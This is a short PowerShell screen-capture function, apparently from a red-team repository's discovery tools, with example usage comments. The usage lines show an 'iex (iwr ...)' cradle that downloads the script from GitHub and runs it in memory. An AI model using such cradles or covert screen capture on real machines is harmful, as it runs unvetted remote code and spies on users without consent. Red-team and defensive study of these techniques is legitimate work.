# Example usage:
# iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_3.ps1);Get-ScreenCapture
# OR
# powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_3.ps1);Get-ScreenCapture"
# Deafult path: $pwd)


function Get-ScreenCapture
{
    param(    
    [Switch]$OfWindow        
    )


    begin {
        Add-Type -AssemblyName System.Drawing
        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
            Where-Object { $_.FormatDescription -eq "JPEG" }
    }
    process {
        Start-Sleep -Milliseconds 250
        if ($OfWindow) {            
            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
        } else {
            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
        }
        Start-Sleep -Milliseconds 250
        $bitmap = [Windows.Forms.Clipboard]::GetImage()    
        $ep = New-Object Drawing.Imaging.EncoderParameters  
        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
        $screenCapturePathBase = "$pwd\ScreenCapture"
        $c = 0
        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
            $c++
        }
        $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
    }
}
